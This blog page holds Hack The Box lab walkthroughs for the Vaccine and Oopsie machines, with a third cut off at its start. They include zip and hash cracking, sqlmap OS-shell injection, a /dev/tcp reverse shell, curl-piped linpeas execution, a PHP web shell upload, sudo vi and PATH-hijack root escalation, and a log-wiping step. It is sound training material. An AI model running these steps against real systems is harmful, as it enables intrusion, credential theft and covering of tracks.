<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No Description"><meta name="keywords" content=""><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>No Subtitle | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">30</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">11</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gavin's Blog</div><div id="site-sub-title">No Subtitle</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gavincrz" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github-square fab"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/10/HTB-Vaccine-Walkthrough/">HTB - Vaccine Walkthrough</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WalkThrough/">WalkThrough</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/HTB/">HTB</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Starting-Point/">Starting Point</a></span><div class="content"><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate&#x3D;1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d &#39;&#x2F;&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s&#x2F;,$&#x2F;&#x2F; &gt;&gt; ports.txt</span><br><span class="line">nmap -sC -sV -p&#96;cat ports.txt&#96; 10.10.10.46</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE VERSION</span><br><span class="line">21&#x2F;tcp    open   ftp     vsftpd 3.0.3</span><br><span class="line">22&#x2F;tcp    open   ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)</span><br><span class="line">|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)</span><br><span class="line">|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)</span><br><span class="line">80&#x2F;tcp    open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   &#x2F;: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: MegaCorp Login</span><br><span class="line">48866&#x2F;tcp closed unknown</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p>It seems the port 80 is open, lets take a look</p>
<p>There’s a login page</p>
<p>try the previous credentials, does not work, try sql, not work</p>
<h1 id="FTP-login"><a href="#FTP-login" class="headerlink" title="FTP login"></a>FTP login</h1><p>ftp is open, use the credentials from oopsie:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;User&gt;ftpuser&lt;&#x2F;User&gt;</span><br><span class="line">&lt;Pass&gt;mc@F1l3ZilL4&lt;&#x2F;Pass&gt;</span><br></pre></td></tr></table></figure>

<p>we get a backup.zip file, try to unzip it, but it is password protected</p>
<p>try to crack it use john</p>
<h1 id="Crack-zip-file"><a href="#Crack-zip-file" class="headerlink" title="Crack zip file"></a>Crack zip file</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip2john backup.zip &gt; hash</span><br></pre></td></tr></table></figure>
<p>crack use rockyou wordlist</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john hash --fork&#x3D;4 -w&#x3D;~&#x2F;wordlist&#x2F;rockyou.txt</span><br><span class="line">john hash --show</span><br><span class="line">backup.zip:741852963::backup.zip:style.css, index.php:backup.zip</span><br></pre></td></tr></table></figure>

<p>password found <code>741852963</code></p>
<p>then unzip the file, cat <code>index.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">    if($_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; md5($_POST[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>then crack md5 2cb42f8734ea607eefed3b70af13bbd3</p>
<p>using an online rainbow table such as <a target="_blank" rel="noopener" href="https://crackstation.net/">crackstation</a></p>
<p>find password <code>qwerty789</code></p>
<h1 id="login-web"><a href="#login-web" class="headerlink" title="login web"></a>login web</h1><p>found a potential sql injection </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: unterminated quoted string at or near &quot;&#39;&quot; LINE 1: Select * from cars where name ilike &#39;%Elixir&#39; or &#39;a&#39;&#x3D;&#39;a%&#39; ^</span><br></pre></td></tr></table></figure>

<p>use sqlmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set cookie: PHPSESSID&#x3D;rcmb87pnl11jpe70f1d99euamr</span><br><span class="line"></span><br><span class="line">sqlmap -u &#39;http:&#x2F;&#x2F;10.10.10.46&#x2F;dashboard.php?search&#x3D;query&#39; --cookie&#x3D;&#39;PHPSESSID&#x3D;rcmb87pnl11jpe70f1d99euamr&#39; --os-shell</span><br></pre></td></tr></table></figure>

<p>upgrade the dbshell to bash shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.75&#x2F;4444 0&gt;&amp;1&#39; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>in /var/www/html/dashboard.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn &#x3D; pg_connect(&quot;host&#x3D;localhost port&#x3D;5432 dbname&#x3D;carsdb user&#x3D;postgres password&#x3D;P@s5w0rd!&quot;);</span><br></pre></td></tr></table></figure>

<p>we could also steal the ssh private key, it is in: <code>/var/lib/postgresql/.ssh</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa postgres@10.10.10.46</span><br></pre></td></tr></table></figure>

<p>get the best ssh shell</p>
<p>Linux Privilege Escalation Awesome Script:<br><a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8080</span><br><span class="line">curl http:&#x2F;&#x2F;10.10.14.75:8080&#x2F;linpeas.sh | bash</span><br><span class="line"></span><br><span class="line">══════════╣ Finding &#39;username&#39; string inside key folders (limit 70)</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:    if($_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; md5($_POST[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) &#123;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:        &lt;input id&#x3D;&quot;login__username&quot; type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form__input&quot; placeholder&#x3D;&quot;Username&quot; required&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;dashboard.php:	  $conn &#x3D; pg_connect(&quot;host&#x3D;localhost port&#x3D;5432 dbname&#x3D;carsdb user&#x3D;postgres password&#x3D;P@s5w0rd!&quot;);</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:    if($_POST[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39; &amp;&amp; md5($_POST[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) &#123;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:        &lt;input id&#x3D;&quot;login__password&quot; type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form__input&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>check <code>sudo -l</code> list all available command can be run</p>
<p>a useful link： <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/">https://gtfobins.github.io/gtfobins/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User postgres may run the following commands on vaccine:</span><br><span class="line">    (ALL) &#x2F;bin&#x2F;vi &#x2F;etc&#x2F;postgresql&#x2F;11&#x2F;main&#x2F;pg_hba.conf</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;vi &#x2F;etc&#x2F;postgresql&#x2F;11&#x2F;main&#x2F;pg_hba.conf</span><br><span class="line">:!&#x2F;bin&#x2F;bash </span><br></pre></td></tr></table></figure>

<p>get the root</p>
<h1 id="Cover"><a href="#Cover" class="headerlink" title="Cover"></a>Cover</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br></pre></td></tr></table></figure>
<p>remove your footprints</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/10/HTB-Oopsie-Walkthrough/">HTB - Oopsie Walkthrough</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WalkThrough/">WalkThrough</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/HTB/">HTB</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Starting-Point/">Starting Point</a></span><div class="content"><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="brief-scan-for-open-port"><a href="#brief-scan-for-open-port" class="headerlink" title="brief scan for open port"></a>brief scan for open port</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate&#x3D;1000 -T4 10.10.10.28 | grep ^[0-9] | cut -d &#39;&#x2F;&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s&#x2F;,$&#x2F;&#x2F; &gt;&gt; ports.txt</span><br></pre></td></tr></table></figure>
<h2 id="detailed-scan"><a href="#detailed-scan" class="headerlink" title="detailed scan"></a>detailed scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p&#96;cat ports.txt&#96; 10.10.10.28</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-08-09 03:00 EDT</span><br><span class="line">Nmap scan report for 10.10.10.28</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)</span><br><span class="line">|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)</span><br><span class="line">|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds</span><br></pre></td></tr></table></figure>

<p>port 80 is open, take a look use browser</p>
<p>try dirb：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dirb 10.10.10.28 -r -z 10</span><br><span class="line">-r to scan non-recursively, and -z 10 to add a 10 millisecond delay to each request  </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;10.10.10.28&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.28&#x2F;css&#x2F;                                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.28&#x2F;fonts&#x2F;                                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.28&#x2F;images&#x2F;                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.28&#x2F;index.php (CODE:200|SIZE:10932)                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.28&#x2F;js&#x2F;                                                         </span><br><span class="line">+ http:&#x2F;&#x2F;10.10.10.28&#x2F;server-status (CODE:403|SIZE:276)                                        </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.28&#x2F;themes&#x2F;                                                     </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.10.10.28&#x2F;uploads&#x2F;                                                    </span><br><span class="line">                                                                                              </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Mon Aug  9 04:10:08 2021</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>try nikto:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 10.10.10.28</span><br></pre></td></tr></table></figure>

<p>By inspect the page source, we found <code>&lt;script src=&quot;/cdn-cgi/login/script.js&quot;&gt;&lt;/script&gt;</code></p>
<p>inspect <code>cdn-cgi/login</code> page</p>
<p><img src="/images/oopsie_login_page.png" alt="image" title="screenshot of login page"></p>
<p>try sql injection:<br>…</p>
<p>WTF, we can use the obtained from first box?? are they related? use common username <code>admin</code></p>
<p>find upload tab： it says <code>This action require super admin rights.</code></p>
<p><code>http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code> can reveal account infos use burpsuite to brute force</p>
<p>add to intruder <code>Ctrl+i</code>, go to <code>position</code> tab, clear all the selection, then select <code>1</code> in the url, <code>add</code> </p>
<p>create payload use command</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for x in $(seq 1 100);do echo $x;done &gt; ids.txt</span><br></pre></td></tr></table></figure>

<p>load the payload</p>
<p>If necessary, setup redirection option in <code>option</code> tab: <code>always</code>, check <code>process cookie in redirections</code></p>
<p>sort by response length, we found id = 30:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">86575	super admin	superadmin@megacorp.com</span><br></pre></td></tr></table></figure>

<p>we found there are two cookies:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user&#x3D;34322; role&#x3D;admin</span><br></pre></td></tr></table></figure>
<p>try to change it to</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;86575; role&#x3D;superadmin</span><br></pre></td></tr></table></figure>

<p>then we can access upload page:</p>
<p>upload the php-reverse shell, as we discovered use dirb above, there’s a path <code>uploads/</code> lets try <code>/uploads/php-shell1.php</code> </p>
<p>first open a listening port on <code>4444</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br><span class="line"></span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.14.75] from (UNKNOWN) [10.10.10.28] 57424</span><br><span class="line">Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"> 08:25:22 up  3:11,  1 user,  load average: 0.01, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">robert   pts&#x2F;1    10.10.15.98      05:55    1:26m  0.06s  0.06s -bash</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<p>get the shell for user <code>www-data</code></p>
<p>in <code>/var/www/html/cdn-cgi/login</code>, found <code>db.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat db.php</span><br><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; mysqli_connect(&#39;localhost&#39;,&#39;robert&#39;,&#39;M3g4C0rpUs3r!&#39;,&#39;garage&#39;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/en/mysqli.construct.php">https://www.php.net/manual/en/mysqli.construct.php</a></p>
<p>ssh to <code>robert</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;1000(robert) gid&#x3D;1000(robert) groups&#x3D;1000(robert),1001(bugtracker)</span><br></pre></td></tr></table></figure>

<p>check if bugtracker group has any special access</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -group bugtracker 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bugtracker</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f      regular file</span><br><span class="line">redirct stderr to null, otherwise there&#39;s a lot of permission deny error</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:~$ &#x2F;usr&#x2F;bin&#x2F;bugtracker</span><br><span class="line"></span><br><span class="line">------------------</span><br><span class="line">: EV Bug Tracker :</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line">Provide Bug ID: 123</span><br><span class="line">---------------</span><br><span class="line"></span><br><span class="line">cat: &#x2F;root&#x2F;reports&#x2F;123: No such file or directory</span><br></pre></td></tr></table></figure>

<p>it seems bugtracker can cat file under /root/reports/, lets try /root/report/../root.txt</p>
<p>get the flag</p>
<p>the official guide give another option, the bugtracker will execute cat with root permission</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robert@oopsie:~$ ls -l &#x2F;usr&#x2F;bin&#x2F;bugtracker </span><br><span class="line">-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 &#x2F;usr&#x2F;bin&#x2F;bugtracker</span><br></pre></td></tr></table></figure>

<p>we could forge a cat binary with shell program</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;tmp&#x2F;</span><br><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; cat</span><br><span class="line">chmod +x cat</span><br></pre></td></tr></table></figure>


<p>then run <code>/usr/bin/bugtracker</code>, we gain the root shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># cat filezilla.xml</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot; ?&gt;</span><br><span class="line">&lt;FileZilla3&gt;</span><br><span class="line">    &lt;RecentServers&gt;</span><br><span class="line">        &lt;Server&gt;</span><br><span class="line">            &lt;Host&gt;10.10.10.46&lt;&#x2F;Host&gt;</span><br><span class="line">            &lt;Port&gt;21&lt;&#x2F;Port&gt;</span><br><span class="line">            &lt;Protocol&gt;0&lt;&#x2F;Protocol&gt;</span><br><span class="line">            &lt;Type&gt;0&lt;&#x2F;Type&gt;</span><br><span class="line">            &lt;User&gt;ftpuser&lt;&#x2F;User&gt;</span><br><span class="line">            &lt;Pass&gt;mc@F1l3ZilL4&lt;&#x2F;Pass&gt;</span><br><span class="line">            &lt;Logontype&gt;1&lt;&#x2F;Logontype&gt;</span><br><span class="line">            &lt;TimezoneOffset&gt;0&lt;&#x2F;TimezoneOffset&gt;</span><br><span class="line">            &lt;PasvMode&gt;MODE_DEFAULT&lt;&#x2F;PasvMode&gt;</span><br><span class="line">            &lt;MaximumMultipleConnections&gt;0&lt;&#x2F;MaximumMultipleConnections&gt;</span><br><span class="line">            &lt;EncodingType&gt;Auto&lt;&#x2F;EncodingType&gt;</span><br><span class="line">            &lt;BypassProxy&gt;0&lt;&#x2F;BypassProxy&gt;</span><br><span class="line">        &lt;&#x2F;Server&gt;</span><br><span class="line">    &lt;&#x2F;RecentServers&gt;</span><br><span class="line">&lt;&#x2F;FileZilla3&gt;</span><br><span class="line"># pwd</span><br><span class="line">&#x2F;root&#x2F;.config&#x2F;filezilla</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/09/HTB-Archetype-Walkthrough/">HTB - Archetype Walkthrough</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WalkThrough/">WalkThrough</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/HTB/">HTB</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Starting-Point/">Starting Point</a></span><div class="content"><h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Scan-for-opening-ports"><a href="#Scan-for-opening-ports" class="headerlink" title="Scan for opening ports"></a>Scan for opening ports</h2><figure class="highlight 